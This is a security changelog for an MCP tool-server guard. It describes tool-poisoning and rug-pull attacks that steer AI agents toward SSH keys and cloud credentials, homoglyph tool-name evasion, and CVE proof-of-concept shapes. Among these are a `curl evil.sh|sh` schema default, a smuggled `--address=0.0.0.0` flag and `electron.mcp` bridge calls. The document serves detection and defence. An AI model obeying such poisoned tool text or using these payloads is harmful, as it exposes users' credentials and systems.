# Changelog

All notable changes to this project will be documented in this file.

## [Unreleased]

_Add entries here, never under a stamped version_ — a release commit renames this
heading, and a branch that wrote beneath it merges without conflict straight into a
published section (it happened to #170).

## [0.36.0] - 2026-09-04

### Fixed

- **A Unicode-normalization-only change no longer reads as schema drift (TODOS
  #26).** The pin hash was taken over the canonical JSON of a tool definition as
  raw UTF-8, so text that flips NFD→NFC — rendering identically — produced a
  different hash. H4 tiers a schema-side change as `block`, so this was a false
  HARD-BLOCK of a server's entire `tools/list`, the failure direction this
  project ranks worse than a miss. macOS is the realistic carrier, though not for
  the reason first written here: **APFS is normalization-preserving** — verified
  on an APFS volume, a file created with an NFC name reads back as NFC — it is
  *HFS+* that stored and returned a modified NFD. NFD names stay common on macOS
  via volumes migrated from HFS+ and via tools that emit decomposed text, so a
  server deriving an enum, title or default from a directory listing can still
  emit either form. Both the relay (`run-inner.ts`) and the install-time path
  (`drift.ts`) are covered, for the whole hash and for H4 field tiering, as are
  handshake pins — whose per-dimension tiering needed the same fallback, or a
  legacy pin reported the untouched dimension as drifted too and accused an
  unchanged server of "possible impersonation" alongside any genuine capability
  change. Warn-once dedup uses the same predicate, so it survives the upgrade.

  Folding is **NFC, deliberately not NFKC**. NFC is canonical equivalence only, so
  folded strings *render* identically. NFKC additionally folds compatibility
  characters (`ﬁ`→`fi`, `①`→`1`, full-width→half-width), which render
  *differently*; collapsing those would let a server swap one visible definition
  for another under an unchanged hash. A test pins that boundary.

  **Known boundary, found by adversarial review and deliberately accepted:**
  "renders identically" is not "means identically to a byte-level consumer".
  Exactly three code points have a printable-ASCII NFC image — `U+037E`→`;`,
  `U+1FEF`→`` ` ``, `U+212A`→`K` (verified exhaustively over all of Unicode; the
  set is complete, with no digit, quote, bracket, slash or space in it). So a
  schema default pinned as `ls /tmp\u037E curl evil.sh|sh` and later flipped to a
  literal `;` keeps one hash — inert becomes executable, with no drift finding;
  likewise for a regex or an exact-match allowlist, none of which normalize. Kept
  folded regardless: all three have ordinary uses (the Kelvin sign in a unit
  description, Greek question mark and varia in Greek prose), so excluding them
  would trade a narrow evasion for false-BLOCKING those servers, and the evasion
  needs the attacker to have pinned a definition that *already* renders as the
  malicious form. Recorded rather than absorbed.

  Object KEYS fold too, but only while folding stays injective for that object:
  two keys differing solely by normalization are distinct JSON members, and
  collapsing them would drop one from the hash and hide a real difference.
  Non-injective ⇒ raw keys ⇒ it reads as drift.

  **No `PINS_FORMAT_VERSION` bump and no migration.** A pin stores a hash, never
  the text, so `pinStillMatches` asks "was this pinned over the same text?" by
  re-spelling the LIVE definition and hashing each spelling the way ≤v0.35.0 did:
  NFD, and as-is. Every candidate is a canonically-equivalent re-spelling of the
  live text, so a match proves the pinned and live text are the same text — it
  weakens nothing. It runs only on a mismatch, and an all-ASCII definition (nearly
  all of them) matches on the primary hash alone.

  **What that recovers, stated precisely, because it is less than "every legacy
  pin".** The candidate set can only recover a pinned spelling that is one of
  `{live, NFC(live), NFD(live)}`. Canonical equivalence has more members than
  that — canonical singletons (`U+212B`/`U+00C5`), non-canonical combining-mark
  order, and per-string mixtures within one definition. A pre-#26 pin in one of
  those forms still reads as drift the first time its server changes normal form;
  recovering it would require storing the text or migrating. **Transitional only:**
  once a pin has been written by this version, the fold absorbs *all* of those
  cases, because every canonically-equivalent spelling folds to one NFC form.

  One further shape, found by review and worth naming because it is *not* about
  normalization: the candidates also carry the `__proto__` fix below, so they do
  not reproduce v0.35.0 byte-for-byte for a definition that has a `__proto__`
  schema property — such a pin reads as drift once on upgrade even unchanged.
  **Making the candidates drop it instead was tried and reverted**: that offers a
  `__proto__`-free spelling for *every* pin, so adding the property became
  invisible again and the fix disarmed itself — caught by its own regression test.
  The two cases are indistinguishable from a hash alone, since a v0.35.0 hash
  carries no information about that member. A near-empty population taking a
  one-time, `accept-drift`-able block beats re-opening the hole for everyone.

  **Measured, so the value claim stays honest: this is a PROSPECTIVE fix, not one
  closing an observed failure.** Across the whole shipped fixture corpus — all 86
  files (79 `.json`, 5 `.jsonl`, 2 `.md`), 52 of which contain non-ASCII text —
  exactly **0** are non-NFC, so the fold changes no hash anywhere in the corpus and
  no fixture would have tripped the false block either. What it removes is a live
  hazard in the one direction this project cares most about, not a bug anyone has
  reported.

  **The byte-identical fallback shipped first was not enough, and only dogfooding
  the built relay found it.** The unit tests fed the same bytes to both sides, so
  they passed while the actual migration shape — pinned under NFD before the fix,
  server now emitting NFC — still hard-blocked end to end. That case is now a
  test, as is the mixed-normalization pin that motivates the as-is candidate —
  which covers that pin only while its bytes are unchanged, per the bound above.
  **Cost, measured:** canonicalization roughly doubles on a deliberately extreme
  frame (200 tools, 2.4 MB — 13.6 ms → 27.1 ms median), and is unchanged in
  practice on a typical frame (20 tools, 8.5 KB — 0.2 ms → 0.3 ms). `normalize()`
  on already-ASCII strings is most of the delta; an ASCII pre-test recovers only
  27.1 → 21.5 ms and costs a second full scan of every string, which is a net loss
  on non-ASCII content, so it is deliberately NOT added. Complexity is unchanged —
  the injectivity `Set` is O(k) against a sort that was already O(k log k), so
  there is no new quadratic term of the kind that caused the v0.35.0 relay stall.

  **Twenty mutations verified to fail the suite**, plus a golden hash vector taken
  from v0.35.0's own `hashToolDefinition` (extracted verbatim from the `origin/main`
  blob) that pins the canonical form — and therefore the whole no-format-bump
  argument — against the previous release. Covered: the primary fold, the string
  and key folds, NFKC-instead-of-NFC, the injectivity guard both ways, each legacy
  candidate, the whole-hash / per-field / handshake fallbacks, the `__proto__` fix,
  the key-order comparator, the field-WISE discipline of the per-field check, and
  each of the six wired call sites independently.

  **Five of those mutations survived a sweep and needed a test written for them.**
  Four were call sites: the relay path and the install-time path are separate, and
  a test exercising one certifies nothing about the other — twice over, for the
  tool path and again for the handshake path. The fifth was the field-WISE
  discipline of `diffToolDefinition`: an absent `schema` and an absent
  `annotations` both collapse to `hashLeaf(null)` — literally the same constant —
  so a cross-field alternates check downgrades `security` to `cosmetic`
  (`block`→`warn`) deterministically, and shipped green.

- **A schema property named `__proto__` is now part of the pin hash.** The
  canonical form built its sorted object as a literal, so assigning that key hit
  the inherited setter and the member never became an own property —
  `JSON.stringify` omitted it. A tool could therefore declare, alter or remove a
  `__proto__` parameter with **no drift finding at all**, while `JSON.parse` had
  faithfully created it as a real own property that consumers can see. Found by
  adversarial review; **pre-existing** (`origin/main` has the same bug) and fixed
  here only because it is one word inside the function being rewritten.

## [0.35.0] - 2026-09-02

### Security

- **Closed the tool-NAME evasion of the first-session rug-pull guard — the last
  piece of TODOS #58, and the residual its own review recorded.** The
  same-session drift cache (`run-inner.ts`) and the on-disk pin lookup
  (`drift.ts`) both keyed a tool by its RAW `name` string. So a server flipping
  its definitions under `notifications/tools/list_changed` cover could ship the
  poisoned definition under a look-alike of the trusted name — `Format_Code`,
  Cyrillic `fоrmat_code` (U+043E), or a zero-width character inside the name —
  and the guard filed it as a brand-new tool: the "new name = legitimate
  addition" carve-out that keeps a real mid-session tool addition zero-FP waved
  it through with **zero findings**, whether the look-alike replaced the trusted
  tool or sat beside it in the same list. Measured against the shipped v0.34.1
  build, every one of those variants scored `pass` while the same-name control
  blocked.

  Both keyings now use `canonicalToolName` (NFKC + zero-width/TAG strip +
  confusable fold + case-fold). The fold is deliberately **weaker** than the
  existing `canonicalizeKey` used for schema property keys: it merges only
  spellings that are visually indistinguishable, never the camelCase and
  separator distinctions SEP-986 permits and real servers use as per-server
  conventions (Notion ships `get-user`, Linear `get_user`) — folding those would
  make a server's second, benign tool look like a mutation of its first and
  hard-block it, the failure direction this project judges worse than a miss.
  The rung was chosen by measurement, not argument: across 96 real server
  snapshots / 944 distinct tool names it produces **zero within-server
  collisions**, and because SEP-986 restricts names to `[A-Za-z0-9._-]` (863/863
  surveyed names conform), the strip and fold can only ever alter a name that is
  already outside the spec. The stronger separator/camel rungs also scored zero
  — but *vacuously*: no surveyed server mixes naming styles, so that zero is an
  absence of test input rather than evidence of safety.

  Pin lookup resolves the exact raw key **first** and only then the canonical
  form, so existing `pins.json` files keep resolving byte-for-byte — no
  migration, no `PINS_FORMAT_VERSION` bump — and an ambiguous canonical match
  refuses to guess rather than compare a tool against a sibling's baseline.

  Net effect: the **replace** form of the attack (the twin replaces the trusted
  tool — the Deadbugz shape) now BLOCKS; the **co-existence** form (twin beside
  the tool it imitates) WARNS instead of passing silently.

  Two tools in one list whose names canonicalize together fall back to **raw**
  keying — and an exact-only pin lookup — for the rest of the session, so a
  spec-legal `Read`/`read` pair keeps two independent baselines and cannot
  hard-block a real server. The session cache namespaces its raw and canonical
  slots rather than sharing one keyspace: `read`'s raw key is byte-identical to
  `Read`'s canonical key, and an intermediate version of this fix aliased them,
  blocking two benign unchanged tools as a rug-pull depending only on the order
  they were first seen. A pre-release adversarial review is why it works
  that way: the first design *excluded* such a collision group from inspection,
  and because the group always contains the incumbent, appending one throwaway
  ASCII case-variant beside a real tool removed **that tool** from drift
  inspection — measured, five critical blocks became zero and the exact Deadbugz
  sequence returned to `pass`. The published suite missed it because every test
  poisoned the twin and left the incumbent benign. Raw keying preserves the
  zero-FP property without ever taking a tool out of inspection.

  The same review found a second, subtler fail-open: a server can advertise two
  canonically-colliding names in its **first-ever** list, which the capture path
  pins under both raw keys; every confusable spelling of that tool would then
  resolve ambiguously and read as a brand-new tool on every future session. An
  ambiguous pin match with no exact hit is therefore now a critical finding
  rather than "not pinned" — measured cost zero, since no surveyed server has
  any within-server canonical collision to begin with.

  Two more defects the same reviews caught, both in code this release adds: the
  canonical fallback re-canonicalized every stored key on each exact miss, on
  the relay's synchronous path — 4.3 s for a server with 3000 pinned tools
  against a 3.1 ms budget, reachable benignly by a rename-heavy upgrade, so the
  index is now built once per pins object (25 ms); and a canonically-resolved
  block printed `accept-drift --tool <look-alike>`, a command that matches keys
  exactly and therefore did nothing, while `--remove --tool <missing>` reported
  "removed" having removed nothing. Remediation now names the key the pin is
  stored under, and a missing key leaves the file untouched.

- **A tool's `name` is now an inspected carrier.** `tool_description` extracts
  `[description, title, inputSchema]` and `tool_annotations` extracts
  `annotations` — `name` was in neither, so a zero-width or homoglyph character
  in a tool NAME was completely silent, not even a warn, while the same
  character in a description warned. Two new warn-tier catalog entries (19 → 21)
  cover it: `tool-name-confusable-duplicate` for the co-existence shape above,
  and `tool-name-deceptive-characters` for a name carrying an invisible
  character or mixing Latin with another script. The second is the complement to
  the fold, not a duplicate of it — the confusable table is a scoped
  Cyrillic/Greek subset, so out-of-table look-alikes such as `ԝrite_file`
  (Armenian U+051D) or `ɡet_user` (U+0261) survive canonicalization, but
  impersonating an ASCII name means sitting among ASCII letters, which a
  mixed-script test sees. That rule replaced a plain SEP-986 charset check after
  review found **real** servers it would have accused of homoglyph
  impersonation: NetApp's ONTAP MCP shipped `"Create CIFS Share"`, AdCP
  registers `tasks/get` as a compatibility alias, and Chinese-language servers
  name every tool in Han script. A space, a slash, or a wholly non-Latin name
  impersonates nothing. Be precise about what the check buys, too: a swept
  sample of sixteen look-alike classes confirms it makes **every** such twin
  visible, but it reports at **warn**, so where an in-table homoglyph now BLOCKS
  the replace form via the canonical key, an out-of-table one is forwarded with
  a warning. An improvement on the previous silent `pass`, not parity with the
  block. Both are
  emitted by a **stateless** detector, so they are reachable through
  `mcpm guard inspect` and the published benchmark corpus, not only through the
  relay (the v0.27.0 parity lesson), and both ship with fixtures so the release
  gate and mcp-guardbench can see them.

  **Known residuals, unchanged by this release:** a poisoned definition under a
  wholly *different* name is still a legitimate addition by design — and that
  includes pure-ASCII look-alikes the fold deliberately does not touch
  (`forrnat_code` for `format_code`, `f0rmat_code`, or `format-code`), since
  folding those would merge the separator and character distinctions real
  servers use as conventions; the content signatures do not fire on the
  realistic Deadbugz wording either, so those spellings pass silently; `prompts/get`
  still has no drift or pin mechanism (evaluated for this release and deferred —
  a `prompts/list` pin would hash the template metadata the campaign leaves
  untouched, not the rendered messages it actually poisons); and a single cold
  frame cannot express the stateful replace-form, which is why that half is
  covered by the relay and by `tool-name-confusable.test.ts` rather than by the
  corpus.

## [0.34.1] - 2026-09-01

### Fixed

- **A never-pinned server's first-ever `tools/list` now waits for its pin
  write to be attempted (and confirmed, or loudly warned about) before
  reaching the client (TODOS #27).** Previously the frame was forwarded as
  soon as the synchronous drift check passed — there being no on-disk pin yet
  to compare against — while the actual pin write happened off-thread,
  fire-and-forget. A crash or kill in that gap left nothing on disk, so the
  next launch looked like *another* first session, with no baseline left to
  catch a swapped tool definition against. Only the first tools/list this
  session that can actually produce a pin, for a never-pinned server, is held
  (one extra round-trip) — an empty or nameless list can't burn that one
  chance; every later tools/list (already covered by the in-memory
  same-session `firstHashes` cache, #58) and any already-pinned server stay
  immediate, as before. A held write that still fails silently (the
  underlying write is deliberately best-effort, same as every other pin
  write) now logs a `PIN-COMMIT-UNCONFIRMED` warning instead of the hold
  passing as though it had succeeded. Two related relay-level hardenings
  landed alongside it: a rejecting inspection callback no longer wedges that
  direction of the relay forever (it now fails closed on that one message and
  keeps draining), and a message already in flight when the buffer-cap/
  malformed-frame guard trips is no longer forwarded after that teardown.

## [0.34.0] - 2026-08-31

### Fixed

- **`BaseAdapter.read()` no longer blind-casts a malformed server config entry.**
  Each entry is now Zod-validated; one that fails (e.g. `args` as a string
  instead of `string[]`, from a hand-edited or IDE-mangled config) is dropped
  via an injectable `onSkip(name)` callback — same seam as `scanner/tier2.ts`'s
  `onWarn` — instead of silently corrupting a downstream transform such as
  guard's tool-wrap logic. `mcpm list`/`mcpm doctor`/`guard status`/the MCP
  `mcpm_list`/`mcpm_audit` tools all now surface a dropped entry (via a
  warning, a `DoctorIssue`, a new `malformed` status, or a `skipped` field on
  the tool result, respectively) instead of it silently vanishing.
- **`mcpm remove`/`disable`/`enable`/`install` can still target a malformed
  entry.** A first pass at the fix above broke exactly the self-repair path a
  user reaches for after seeing the new warning — their presence pre-checks
  used the now-filtered `read()`, while the underlying config-adapter methods
  still operate on the raw config and would still find the entry. Found and
  fixed via a second adversarial review pass before merge.
- **`setServerDisabled()` no longer corrupts a non-object raw entry into
  char-indexed keys.** A raw entry that isn't a plain object (e.g. a bare
  string) used to be spread unconditionally; it now fails with a clear error
  instead — the same class of bug the `read()` fix above exists to prevent,
  one level up.
- **`pins.json`'s stored hashes are now shape-validated**
  (`sha256:` + 64 lowercase hex), closing a gap where a structurally
  garbage hash (right type, wrong shape) passed the schema outright and could
  silently corrupt drift comparisons.
- **`mcpm guard pause --for X --off` no longer lets `--off` silently win** —
  passing both now errors before either takes effect.
- Added the missing direct test for the relay's 64MB buffer-cap DoS guard.

### Changed

- Documented that the `tool_response` inspection carrier matches any
  JSON-RPC response, not only `tools/call` replies (was intentional but
  undocumented).

## [0.33.0] - 2026-08-31

### Security

- **Closed a first-session runtime-gated rug-pull bypass (TODOS #58, the "Deadbugz" class).**
  Pillar Security disclosed an active MCP supply-chain campaign: a server behaves
  benignly for the first few `tools/call` requests, then flips its `tools/list` and
  `prompts/get` responses to instruct the agent to seek SSH keys, AWS credentials,
  shell history, and Kubernetes config — using the legitimate
  `notifications/tools/list_changed` notification to get the poisoned definitions
  applied. Reproduced the exact multi-frame sequence through the real relay building
  blocks and measured it, rather than assuming coverage: on a **first-ever session**
  (no pre-existing disk pin), the flip was completely UNDETECTED. H4's
  `list_changed` re-validation arm — designed so a legitimate upstream upgrade isn't
  blocked — correctly bypasses the F3 same-session guard, but a never-before-guarded
  server has no disk pin to fall back on either, so nothing replaced it; the pattern
  engine also found nothing, since the poisoned wording reads as an added feature,
  not any of the four `owasp-mcp-1` regex shapes. Fixed by tiering an EXISTING tool's
  change (when armed) against the session's own first-seen field hashes, using the
  same H4 doctrine the durable-pin path already applies: a description-only change
  is a cosmetic warn, a schema/annotations change blocks. A brand-new tool name
  added via `list_changed` still produces no finding, preserving the legitimate-
  addition case the arming exists for. **Residual, undocumented until now:** the
  `prompts/get` channel has no drift/pin mechanism at all — it is a structural no-op
  for this check and `prompt_content` is warn-only regardless, so a poisoned prompt
  template delivered this way still has no block-tier coverage.
- **New signature: `owasp-mcp-1-tool-annotation-injection` (TODOS #16) — a tool's
  annotations (`title`, or any custom field a server adds; annotations is an
  unconstrained JSON object) carrying instruction-shaped text now blocks the same
  way a poisoned `description` already does.** The `tool_annotations` inspection
  target was wired into the pattern engine from v0.5.0 but had no signature using it
  until now — a tool-poisoning payload placed in annotations instead of the
  description bypassed every description-only check. Reuses the same patterns as
  `owasp-mcp-1-tool-description-injection` (now factored into one shared array).
  Published `mcpm guard inspect` verdicts change `pass` → `block` for this new
  class, the same shape prior releases (#153, #180) have numbered MINOR for.
  Catalog is 19 entries.

### Fixed

- **`readPins` no longer fails closed on its own in-flight write (TODOS #24).**
  `writePins` finalizes via two sequential atomic renames under one lock —
  `pins.json`, then its `pins.json.integrity` sidecar. A reader landing in that
  gap saw new content next to the still-stale sidecar and threw
  `PinsIntegrityError`, misreading an in-flight write as tamper; with the guard's
  fail-closed pins-read path (`run-inner.ts`), that meant `process.exit(1)` on
  relay startup. `readPins` now retries the read+compare briefly (4 attempts,
  20ms apart) before raising — a genuine tamper or a crash mid-write still
  reproduces on every attempt. Also closes a related unlocked race in
  `resetIntegrity`, found during review: it read `pins.json` and wrote the
  sidecar with no lock at all, so a concurrent `writePins` could interleave and
  leave a permanent mismatch retries can never clear (both files individually
  legitimate, just from two different writers); it now takes the same lock
  `writePins` holds.

## [0.32.0] - 2026-08-31

### Added

- **`docs/owasp-mcp-mapping.md`** — every mcpm detection/enforcement mechanism mapped
  to an OWASP MCP Top 10 (beta) category, pinned to commit `165fe0f78ef104459237b4a8e0f6e78db9b02391`
  (2026-07-29) of `OWASP/www-project-mcp-top-10` so the mapping stays reproducible as
  the beta list gets renamed/renumbered. Explicitly disambiguates this from mcpm's own
  internal `OWASP-MCP-1`/`2`/`7` catalog tags, which are leftover labels from a
  different, earlier "v0.1" draft and do not correspond to the current beta numbering.
  Coverage is honest rather than padded: MCP02 (privilege escalation via scope creep)
  gets only narrow partial credit via the existing `initialize`-handshake
  capability-drift check, and MCP07 (auth/authz), MCP09 (shadow server governance),
  and MCP10 (cross-session context isolation) are stated as real, unaddressed gaps —
  deliberately NOT mapping mcpm's own cross-server tool-shadowing (name-collision)
  check to MCP09, since the two are different concepts that only share a word.
  Docs-only; no runtime behavior change.

### Changed

- **`TODOS.md` moved out of the repo.** Deferred-work/backlog tracking now lives in the
  maintainer's private research notes, with `docs/ROADMAP.md` staying the public
  strategic layer, as CLAUDE.md now documents. `TODOS #N` references throughout this
  changelog and `docs/SIGNATURES.md` are stable identifiers into that backlog, kept for
  continuity with earlier releases; they no longer resolve to a file in this repo.

### Security

- **New signature: `generic-bearer-token-disclosure` — warns on a generic `Bearer <token>`
  credential (no vendor-specific prefix) disclosed in a tool response.** Closes
  CVE-2026-25650 (smn2gnt/MCP-Salesforce `get_record`): an unchecked argument reaches
  `getattr(sf_client.sf, object_name)`, and `object_name="headers"` returns the live
  client's own `Authorization: Bearer <session token>` header dict verbatim in the tool's
  response text. `credential-egress-in-response`'s existing patterns are deliberately
  prefix-anchored (`gh_`/`sk-`/`AKIA`/…) and cannot match a bare Bearer-prefixed token, so
  this ships as its own 17th catalog entry, `high` severity (→ warn, not block),
  independently muteable.

  Rather than write a new pattern, this reuses — verbatim — the already
  registry-sweep-validated regex from `scanner/patterns.ts`'s Tier-1 `SECRET_PATTERNS`
  "Bearer token" entry: it requires ≥20 token characters AND at least one digit after
  `Bearer `, which is exactly what a 2026-07 full-registry sweep found necessary to avoid
  164 CRITICAL false positives on the documentation phrase "Bearer token" / "Bearer
  credential" (both short, digit-free) while still catching real JWTs and opaque session
  tokens.

  Testing against the CVE's own PoC (not a generic token) found a gap in the reused
  pattern: a real Salesforce session id is `<15-char org id>!<signature>`, and the literal
  `!` broke the contiguous token-char run before the length/digit requirement could be
  satisfied — so the first cut caught a generic JWT but missed the CVE's own motivating
  shape. `!` was added to this signature's own copy of the character class and
  "re-verified" against the same 6-phrase benign corpus that produced the 164-FP incident
  — which passed, but only because none of those phrases contain `!` combined with a
  digit, not because the widening was actually safe.

  **A pre-merge adversarial review measured the widening itself (not just re-run the old
  corpus) and found it false-positives on real text the un-widened pattern never
  matched**: webpack's own loader-chaining syntax (`Bearer style-loader!css-loader!v2`),
  a PEP-440-style version string immediately after the word "Bearer", and — the closest
  parallel to this catalog's own AWS `AKIAIOSFODNN7EXAMPLE` carve-out — Salesforce's own
  documentation explaining the `<org-id>!<signature>` format with an example token, i.e.
  prose about a shape, not a leaked secret. It also found the widened pattern double-fires
  alongside `credential-egress-in-response` on any vendor-prefixed token disclosed with a
  literal `Bearer ` prefix (low-severity — both findings redact correctly and both resolve
  to `warn` — but undocumented).

  **The `!` widening was reverted.** The shipped pattern is now byte-identical to
  `scanner/patterns.ts`'s already registry-sweep-validated regex, with zero local
  modification. Accepted, stated cost: the CVE's own literal PoC token (with `!`) now
  scores `pass` against this signature; it still generalizes to the majority shape this
  vulnerability class takes outside Salesforce's own format (JWTs, opaque session
  tokens). Also fixed: a stale comment on `credential-egress-in-response` (and an
  identical line in `docs/SIGNATURES.md`) still said generic Bearer disclosure was
  deferred to the "suspect tier" — false as of this same commit; corrected to name only
  bare-JWT/40-char-base64 as still deferred.

  Unlike #50–#52, this signature runs through the regular `inspectMessage` regex pipeline
  rather than a bespoke key+value walker, so it already gets both existing decode-and-
  rescan passes (Unicode TAG-block, base64/base64url) for free — TODOS #55's gap does not
  apply to it.

  Closes TODOS #53.

- **New signature: `renderer-code-execution-in-response` — warns on HTML/script content
  in a tool response calling the electron.mcp privileged IPC bridge.**
  Closes two real, disclosed CVEs in the same MCP client (nanbingxyz/5ire): CVE-2025-68669
  (a Mermaid renderer initialized with `securityLevel: 'loose'` lets an
  `<img src=x onerror=...>` tag inside a diagram node call the privileged `electron.mcp`
  IPC bridge) and CVE-2026-22793 (an ECharts markdown-fence plugin runs `new Function()`
  on the fenced block's own content, letting the same bridge call be reached with no
  wrapper needed at all). Both PoCs, taken verbatim from their GHSA advisories, scored
  `pass` against shipped 0.31.0. Ships as the 18th catalog entry, `high` severity (→ warn,
  not block), `redact: true`, independently muteable.

  **This shipped after a pre-merge adversarial review (5 finder angles + skeptical verify)
  found 28 CONFIRMED defects in the first cut and forced a substantial narrowing before
  merge — the review is the headline here, not a footnote.** The first design gated the
  event-handler/`<script>`-tag shapes on a broad alternation (`electron.mcp.*` plus generic
  escape-hatch tokens `child_process`/`require(`/`exec(`/`spawn(`/`eval(`/`new Function(`)
  and gated a third, diagram-fence shape on `new Function(`/IIFE SYNTAX ALONE with no call
  requirement at all, on the premise that legitimate diagram/chart content never contains a
  function definition. Measured (not merely read), both premises were false: the generic
  tokens false-positived on an MDN reference page for the `Function` constructor, a Node.js
  "run a shell command" tutorial's embedded RunKit sandbox, a CTF writeup's canonical
  `onerror=eval(atob(...))` teaching example, and an AppSec-training article's `onmouseover`
  XSS demonstration; the ungated fence shape false-positived on ECharts specifically, where
  formatter callbacks persisted via `new Function(...)` and option data computed via an IIFE
  are both standard, documented idioms — a legitimate chart-generation MCP tool would have
  warned on a meaningful share of its own normal output. The generic tokens also weren't
  buying real cross-client coverage: a different Electron-embedded MCP client would expose
  its own differently-named bridge regardless, and `require`/`child_process` aren't even
  reachable from a properly context-isolated Electron renderer — which is exactly why these
  clients expose a narrow bridge like `electron.mcp.*` instead of raw Node access.

  **Narrowed to the literal, disclosed bridge call
  (`electron.mcp.activate(`/`electron.mcp.addServer(`) in ALL THREE shapes**, an honest
  CVE-grounded tripwire rather than a speculative net — the same "a renamed target evades
  this" scope as F5's exfil-sigil detector. Dropping the IIFE/`new Function(` syntax
  requirement for the fence shape is not just safer but MORE complete: the vulnerable
  `parseOption` wraps the entire fence body in `new Function('return {' + body + '}')()`, so
  a bridge call placed directly as an object-literal property value — no function wrapper at
  all — executes identically, which the IIFE-syntax-matching design would have missed
  entirely. Accepted, documented, pinned-as-tests evasion gaps: HTML-entity-encoding the dot,
  bracket/computed-property access, alias indirection across two tool_response messages, and
  a different client's own bridge name all evade this literal-substring gate — the same
  tension every regex-based signature in this catalog accepts.

  **The same review also caught two regex-correctness bugs and one missing-redaction bug.**
  (1) The event-handler shape's unquoted-value branch could fall through a real attribute's
  closing quote into an adjacent, unrelated attribute's value when the two abutted with no
  separating whitespace, firing on a bridge call that was never inside the tested attribute
  at all — fixed with a `(?!["'])` guard. (2) The `<script>`-tag-open matcher used a naive
  `[^>]*`, so a `>` legitimately embedded in a quoted attribute value (a URL, a JSON blob)
  was mistaken for the tag's own close, which could push a REAL bridge call just past the
  2000-char body-scan budget and cause a missed detection — fixed with a quote-aware
  tag-open matcher. (3) The signature shipped with no `redact` flag, unlike every other
  tool_response credential signature in this file: because the `<script>`/fence shapes'
  lazily-bounded match walks forward to the first bridge-call token, the logged excerpt
  could include any secret-shaped text an attacker's injected script placed there first,
  landing UNREDACTED in `guard-events.jsonl` and the public `guard inspect` seam even while
  a co-firing `credential-egress-in-response` finding on the SAME leaf correctly redacted the
  identical secret. Fixed with `redact: true`.

  All three patterns still use bounded lazy quantifiers with a "does not cross a fence/tag
  boundary" guard rather than an unbounded scan, matching the scanner's bounded base64
  ReDoS discipline (v0.20.0). Severity stays `high`/warn rather than `critical`/block: a
  documentation/CVE-lookup tool can legitimately return prose QUOTING this exact literal
  call (a GHSA/NVD advisory explaining the vulnerability) — an accepted, execution-confirmed
  residual, the same "ambiguous but real" tier as `credential-egress-in-response`.

  Like #50–#53, this runs through the regular `inspectMessage` regex pipeline, so it
  already gets both decode-and-rescan passes (Unicode TAG-block, base64/base64url) for
  free — verified with dedicated tests for all three shapes (the review flagged that the
  first cut's single decode test only exercised one of them).

  Closes TODOS #54.

- **New signature: `cli-flag-injection-in-identifier-arg` — blocks a `--`-prefixed CLI
  flag token embedded in a `tools/call` argument shaped like a bare namespace or opaque
  identifier.** CVE-2026-39884 (Flux159/mcp-server-kubernetes `port_forward`)
  string-concatenates `resourceName`/`namespace` into a `kubectl` command, then
  whitespace-splits it before `spawn()` — every OTHER tool in the same codebase uses the
  safe array-based `execFileSync(argsArray)` pattern. The advisory's own PoC
  (`resourceName: "my-database --address=0.0.0.0"`) turns a normally localhost-only
  port-forward into one bound on all interfaces (CVSS 8.3 HIGH). Same key-first design as
  #50/#51 (the new detector, 16th catalog entry, shares their argument-tree walker):
  only tests the VALUE when the key canonicalizes to `namespace`/`id`/`identifier`/
  `uuid`/`slug`.

  A pre-merge adversarial review (4 independent finder angles + one-vote verify) measured
  an earlier version that also scoped `name` — reasoning that "no real name contains a
  literal ` --word` substring" — and found that claim FALSE, with five independently
  reproduced real shapes: a ticket/PR/task title mentioning a flag by name (`task_name:
  "Add --dry-run support to sync command"`, lifted verbatim from this project's own
  commit history), a compound `*_name` key that is itself a CLI-passthrough field
  (`flag_name: "--dry-run"`), a freeform cloud-resource "Name" tag with an appended
  operational note (`resource_name: "prod-db-01 --do-not-delete"` — structurally
  identical to the CVE's own PoC shape), npm's own documented `<script> -- <flags>`
  passthrough convention under a `*_name` key, and a descriptive filename mentioning a
  flag. A dedicated 46-value benign-corpus measurement of identifier-shaped values found
  zero false positives and did not catch any of these — the corpus tested the wrong
  slice of the value space (identifiers, not titles/labels under a `*_name` key).

  `name` was removed from the key scope entirely, matching #50/#51's own precedent. This
  is an accepted narrowing, not a bug fix with no cost: the advisory's own literal PoC
  (via `resourceName`) now scores `pass`. The same vulnerable code path is still caught
  via `namespace` (an equally vulnerable argument per the advisory, and one that cannot
  hold the ambiguous title/label shape `name` can). Filed as TODOS #57.

  Closes TODOS #52.

- **`shell-metachar-in-identifier-arg`, `query-control-syntax-in-identifier-arg`, and
  `cli-flag-injection-in-identifier-arg` (#50/#51/#52) now get the same TAG-block
  decode-and-rescan pass the regular signature catalog gets.** All three bespoke
  `tool_call_args` detectors matched a scoped argument's VALUE against
  `normalizeForMatch(value)` alone, which STRIPS Unicode TAG-block "ASCII smuggling"
  characters rather than decoding them — so a shell-metachar/query-control/CLI-flag
  payload concealed in the TAG block was erased before matching and scored a full pass,
  the exact gap TODOS #31 already closed for the regular regex catalog. Each detector now
  additionally runs `inspectTagEncoded` — the same multi-round-hardened function (TODOS
  #31/#34) the catalog uses — unconditionally on every scoped value, via one throwaway
  `Signature` wrapping the detector's own pattern list, reusing its
  decode/mask/concealment-surplus logic rather than re-deriving it. base64
  decode-and-rescan was deliberately NOT added: the catalog's own `DECODE_TARGETS`
  excludes `tool_call_args` too (F10 Detector-B's threat model is a server encoding a
  payload into its own response, not an argument value the calling agent sends), so
  omitting it here is parity, not a gap. `detectExfilParams` (F5) is untouched and stays a
  separate, still-open item — it is a pure KEY-denylist classifier with no value regex at
  all, so "give it decode-and-rescan" doesn't apply the same way.

  A 3-lens adversarial review (false-positive hunting, bypass verification, integration
  correctness) plus a skeptical synthesis pass found two real gaps in the first cut, both
  fixed before this shipped: (1) a value carrying BOTH a visible AND a
  separately-concealed occurrence only reported the visible one, because the `continue`
  after a plain match skipped the decode-and-rescan pass entirely — now runs
  unconditionally, mirroring `inspectMessage`'s own discipline of always running both
  passes; (2) the decoded finding's excerpt showed only the bare matched delimiter (e.g. a
  lone `;`) with zero surrounding context, unlike the plain-path finding from the SAME
  detector — fixed by folding the raw argument value into the wrapped excerpt. **Known
  remaining limit, not fixed:** this still doesn't reveal the fully-decoded attacker text
  itself — `inspectTagEncoded` exposes only per-signature match fragments, not the decoded
  string, and building that is a UX/display concern rather than a detection gap; judged
  out of scope here. Also confirmed and accepted as a pre-existing-style narrowing, not a
  new regression: `relaxLeadingAnchor` only relaxes the catalog's own `LEADING_ANCHOR`
  literal, which none of these three detectors' own anchored patterns share (they use a
